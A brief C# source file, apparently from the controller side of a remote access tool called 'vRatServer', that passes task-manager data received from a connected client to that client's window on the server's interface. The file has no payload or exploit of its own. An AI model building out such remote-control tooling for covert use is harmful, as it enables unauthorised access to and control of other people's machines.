using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Packets
{
    class TaskManagerPacket
    {
        

        
        public TaskManagerPacket(Client client, byte[] data)
        {

            Program.f1.Invoke((MethodInvoker)delegate {
                if (client.tkm == null) { return; }

                client.tkm.AddEntry(data);


            });


        }
    }
}
